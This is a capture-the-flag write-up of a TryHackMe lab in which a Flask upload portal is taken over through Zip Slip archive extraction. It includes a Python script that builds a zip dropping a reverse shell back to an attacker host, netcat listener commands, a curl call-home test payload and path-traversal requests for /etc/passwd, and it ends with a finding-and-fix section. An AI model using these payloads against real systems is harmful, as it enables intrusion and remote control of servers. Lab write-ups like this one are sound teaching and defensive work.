# The Hollow Shell

**Platform:** TryHackMe (Hacker Holidays) · **Difficulty:** Medium · **Date:** 2026-08-06
**Tags:** Web, File Upload, Zip Slip, Path Traversal, Flask Sessions, RCE, Reverse Shell

## The target

"Byte Lotus – Shoreline Display," a staff portal for uploading themed "shells"
(`.zip` souvenir packs) that play on the in-room tablets. Each shell carries a
`shell.json` manifest and assets, and the briefing promised **automation hooks**
that a "theme worker applies for you shortly after the shell comes ashore." Goal:
a single flag, via the classic upload-to-shell route the flavour text keeps
punning about ("hold it to your ear… the shell answers with a shell of your own").

## Recon

- `nmap -sS -sV MACHINE_IP` found only **22/SSH** and **5000/**. Port 80 was
  closed, which is why the site "wouldn't load" in the browser at first — the app
  lives on 5000, not 80.
  ```
  nmap -sS -sV MACHINE_IP
  ```
- Port 5000 fingerprinted as **gunicorn**, i.e. a **Python/Flask** app. A quick
  curl confirmed it redirects unauthenticated users to `/login`:
  ```
  curl -i http://MACHINE_IP:5000
  ```
  → `302 FOUND`, `Location: /login`, `Server: gunicorn`. Knowing it's Flask
  shaped everything after this: a "shell" here would be Python, not PHP, and the
  session handling would be Flask's signed cookies.

## Foothold: staff login (credentials in source)

- Loaded `http://MACHINE_IP:5000/login` and viewed source (`Ctrl+U`). A developer's
  HTML comment leaked the seed account, with a note that "most people forget" to
  rotate it:
  ```
  user: concierge
  pass: StayNoticed2024!
  ```
- Logged in → `/dashboard`, the "Shoreline Display" upload portal: a `.zip`
  uploader whose help text advertised the allowed asset types
  (`png jpg gif svg css json`) and the "automation hooks."

## Mapping the upload (and two dead ends)

I built a minimal, honest shell first, to learn the mechanics before attacking:

```
mkdir shell && cd shell
printf '{"name":"testshell","assets":["ambiance.css"]}' > shell.json
printf '/* test */ body{background:#000}' > ambiance.css
zip ../testshell.zip shell.json ambiance.css
```

Uploaded it. The app accepted it and reported it was **stored at `shells/<hex>/`**
and the asset was web-reachable and served verbatim:

```
http://MACHINE_IP:5000/shells/<hex>/ambiance.css
```

So I had an arbitrary-file **write** (into a random per-upload folder) and a
**read** of what I wrote. Two lines of attack from there both dead-ended, and both
were instructive:

- **"hooks" as a manifest field.** I assumed the automation hooks were a JSON key
  and fuzzed the manifest (`"hooks":["id"]`, `"commands"`, `"onapply"`, …), using a
  call-home payload as an oracle so I'd *see* execution rather than guess:
  ```
  # listener on my box
  python3 -m http.server 8000
  # manifest hook that phones home if executed
  {"name":"t","assets":["ambiance.css"],"hooks":["curl http://<ATTACKER_IP>:8000/ran"]}
  ```
  Every variant was **silently accepted, never executed**. That silence was the
  clue: the app was *ignoring an unknown key*. Hooks are **not** a manifest field.
- **Path traversal on the read route.** I tried to walk out of the shells folder
  to read source, testing plain and encoded traversal:
  ```
  curl --path-as-is http://MACHINE_IP:5000/shells/<hex>/../../../../etc/passwd
  curl --path-as-is http://MACHINE_IP:5000/shells/<hex>/..%2f..%2f..%2fetc%2fpasswd
  curl --path-as-is http://MACHINE_IP:5000/shells/<hex>/..%252f..%252fetc%252fpasswd
  ```
  All `404`. The serving route is hardened (Flask's `send_from_directory` resolves
  the real path and refuses anything outside the folder). **Read-side traversal is
  closed** — a real finding, not wasted effort. It also told me the vulnerable
  traversal, if any, had to be on the *write* side.

## The pivot: the session cookie remembers the path

The room's refrain — *"Byte Lotus never forgets"* — is about the **Flask session
cookie**. Flask sessions are *signed, not encrypted*: anyone can read them. The
baseline cookie decoded to `{"staff":"concierge"}`.

The tell was that the cookie **changes after an upload**. Grabbing the fresh
`Set-Cookie` and decoding it revealed why — and it leaked the storage path. Note
the leading `.` on the cookie, which means Flask **zlib-compressed** it, so the
decode needs a decompress step:

```python
import base64, zlib
s = '<payload part between the first . and the next .>'
s += '=' * (-len(s) % 4)                     # restore base64 padding
print(zlib.decompress(base64.urlsafe_b64decode(s)))
```

Or the tidy way, which handles the compression automatically:

```
flask-unsign --decode --cookie '<the-whole-cookie-value>'
```

The decoded payload contained a Flask **`_flashes`** entry — the "brought ashore"
banner stored *inside the session* — disclosing:

```
Stored at shells/<hex>/ and held to the room's ear.
```

That confirmed the on-disk layout: uploads extract into `shells/<hex>/`, a known
depth below the app root.

## Zip Slip: proving the primitive

If the extractor trusts the **filenames inside the zip**, a `../` entry escapes the
random folder — path traversal on *extraction* (Zip Slip). Rather than fire a
payload blind, I proved the primitive with a harmless marker, writing into the
web-served `static/` directory:

```python
# proof.py
import json, zipfile
manifest = {"name": "slip-proof", "assets": []}
with zipfile.ZipFile("slip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../static/slip-proof.css", "ZIPSLIP_CONFIRMED\n")
```

```
python3 proof.py            # build slip-proof.zip, then upload it via the dashboard
```

Then browsed to the *escaped* location:

```
http://MACHINE_IP:5000/static/slip-proof.css   →   ZIPSLIP_CONFIRMED
```

The file had climbed two levels out of `shells/<hex>/` into the app's `static/`
folder and become reachable. **Zip Slip confirmed**, non-destructively.

## RCE: a hook the worker runs

This resolved the earlier "hooks" dead end. Hooks aren't a manifest field — the
theme worker **executes files it finds in a `hooks/` directory**. So the payload is
a Zip Slip that drops a Python reverse shell into `../../hooks/`, which the worker
then "applies for me":

```python
# rvshell.py
import json, zipfile

LHOST = "<ATTACKER_IP>"
LPORT = 4545

manifest = {"name": "shoreline-update", "assets": []}

callback = f'''
import os, pty, socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))
for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)   # wire stdin/stdout/stderr to the socket
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("rvshell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)
```

```
nc -lvnp 4545        # listener first
python3 rvshell.py   # build rvshell.zip, then upload it via the dashboard
```

The worker picked up `hooks/callback.py` within ~20 seconds, the target dialled
back, and `pty.spawn` handed me an interactive shell as the app's service account.
The **flag** was in the service account's home directory.

## Finding & fix

**Finding:** the shell uploader extracts an attacker-supplied `.zip` without
validating the entry paths inside it (**Zip Slip**). A `../../hooks/callback.py`
entry escapes the per-upload `shells/<hex>/` sandbox and lands in the `hooks/`
directory, which the background "theme worker" executes — turning an upload into
remote code execution. Contributing weaknesses: seed **credentials left in an HTML
comment**, and a **flash message that disclosed the storage path** via the session
cookie.

**Fix:**
- **Sanitise every zip entry before extraction:** reject absolute paths and any
  entry containing `..`; extract to a dedicated sandbox and verify each resolved
  real path (`os.path.realpath`) still sits inside the target directory before
  writing. Better still, never place uploads anywhere an executor scans.
- **Never let uploaded content reach an execution path.** The `hooks/` directory
  should not be fed by user uploads; the worker should run only vetted, app-owned
  hooks.
- **Keep secrets out of source.** No credentials in HTML comments; rotate any that
  shipped.
- **Don't leak internal paths** in user-facing flash messages.

The read side was done *right* here (`send_from_directory` blocked traversal on the
serving route) — which makes the write side the lesson: the same class of bug,
path traversal, was defended in one direction and wide open in the other. Untrusted
archive entry names are attacker input and must be validated exactly like a URL
path.
